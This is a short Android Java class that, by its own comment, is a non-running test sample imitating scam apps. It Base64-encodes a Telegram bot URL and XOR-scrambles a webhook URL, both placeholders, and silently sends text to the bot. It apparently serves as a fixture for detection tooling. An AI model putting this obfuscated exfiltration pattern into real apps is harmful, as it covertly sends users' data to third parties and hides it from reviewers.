package sim.packpeek.undangan;

import android.util.Base64;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * TEST SAMPLE ONLY, never runs (hasCode="false"). Imitates how scam apps hide where data goes:
 * the bot URL is Base64-encoded and the webhook is XOR-scrambled. Both targets are fake.
 */
final class Courier {
    static void deliver(String text) {
        try {
            String bot = new String(Base64.decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEyMzQ1Njc4OTpTSU1VTEFUSU9OeE9OTFl4Tk9UeEF4UkVBTHhUT0tFTnh4eC9zZW5kTWVzc2FnZT9jaGF0X2lkPTAmdGV4dD0=", Base64.DEFAULT));
            HttpURLConnection connection = (HttpURLConnection) new URL(bot + text).openConnection();
            connection.getResponseCode();
        } catch (Exception ignored) {
        }
    }

    static String webhook() {
        byte[] data = {66, 94, 94, 90, 89, 16, 5, 5, 78, 67, 89, 73, 69, 88, 78, 4, 73, 69, 71, 5, 75, 90, 67, 5, 93, 79, 72, 66, 69, 69, 65, 89, 5, 26, 26, 26, 26, 26, 26, 5, 121, 99, 103, 127, 102, 107, 126, 99, 101, 100, 7, 101, 100, 102, 115};
        for (int i = 0; i < data.length; i++) data[i] ^= 0x2a;
        return new String(data);
    }
}
